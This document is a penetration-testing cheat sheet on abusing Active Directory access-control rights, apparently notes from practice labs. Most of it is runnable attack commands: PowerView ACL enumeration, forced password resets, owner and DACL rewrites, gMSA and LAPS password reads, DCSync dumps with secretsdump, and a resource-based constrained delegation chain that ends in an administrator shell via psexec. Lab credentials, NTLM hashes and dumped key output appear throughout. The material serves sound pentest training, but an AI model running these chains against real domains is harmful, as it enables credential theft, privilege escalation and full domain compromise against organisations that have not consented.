### References 
https://bloodhound.specterops.io/resources/edges/overview  
It's worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.  
### Enumeration ACL
Powerview
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley or Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
```
ACL permissions wley has over group "GPO Management"
```powershell
Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}
```
### ACE 
**ForceChangePassword** - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).    

**GenericWrite** - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.    

**AddSelf** - shows security groups that a user can add themselves to.    

**GenericAll** - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.    

```powershell
powershell -ep bypass
Import-module .\PowerView.ps1

Find SIDs which has GenericAll Permission on "Management Department" Group:
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Find interesting domain object permissions whose permissions are GenericAll:
Find-InterestingDomainAcl | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

Conver SIDs to UserAccount names:
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```
When Stephanie has GenericAll permissions on "Management Department" group, you can add her to Management Department group
```
net group "Management Department" stephanie /add /domain
```

### Linux Abuse of Over large Permission Over Group and Object
Add the user to the target group
```
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```
Change Existing user password
```
net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
```
### Abusing WriteOwner over User
```
sudo timedatectl set-ntp off                                                                                          
sudo rdate -n 10.10.11.51 
python3 owneredit.py -action write -new-owner 'ControlledUser' -target 'TargetUser' 'domain'/'ControlledUser':'WqSZAF6CysDQbGb3'

python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ControlledUser' -target 'TargetUser' 'domain'/'ControlledUser':'WqSZAF6CysDQbGb3'

net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
```
### Abuse read right over a Group Managed Service Account (gMSA)
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
.\GMSAPasswordReader.exe --accountname=SVC_APACHE

[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 83AC7FECFBF44780E3AAF5D04DD368A5
[*]       aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541
[*]       aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7
[*]       des_cbc_md5          : 9E340723700454E9

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 0AFF0D9DFA8B436E6688697B0A47B50C (NTLM Hash)
[*]       aes128_cts_hmac_sha1 : C958BEE96DEE78F9035F460B91EC6D86
[*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
[*]       des_cbc_md5          : 0804169DCECB6102
```
### Abusing ReadLaps Password
>LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
```
lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.122
lapsdumper -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc host
ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.153.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
### Domain Controller Synchronization
>The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set.

>To perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.

![image](https://github.com/user-attachments/assets/6fc92c9b-f6fc-49cc-a127-e8f41ba74ce2)
```
lsadump::dcsync /user:<user>
kali: impacket-secretsdump -just-dc corp.com/controlledUser:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt

NTDS.DIT Secrets and Kerberos Key:
impacket-secretsdump 'htb.local'/'venom':'newP@ssword2022'@10.10.10.161
```
### Resource Based Constrained Delegation Attack
```
Detection:
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericAll*' }

Output:
AceType               : AccessAllowed
ObjectDN(to)          : CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-537427935-490066102-1511301751-1000
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-537427935-490066102-1511301751-1105
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
Identity(from)        : resourced\L.Livingstone
```
Bloodhound showing GenericAll privileges on the Domain Controller  
![image](https://github.com/user-attachments/assets/8a75dfbe-58a3-44a6-a962-dd34daf4b465)
```
impacket-addcomputer resourced.local/l.livingstone(:password) -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
python3 rbcd.py -dc-ip 192.168.153.175 -t RESOURCEDC(hostname) -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x

Alternate way:
impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
impacket-psexec administrator@backup01.corp.com -k -no-pass
```
![image](https://github.com/user-attachments/assets/dbf59a75-11c3-4517-b0e7-60f5894aba5b)
```
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

Change resourcedc.resourced.local machin_ip_address in /etc/hosts

impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
```
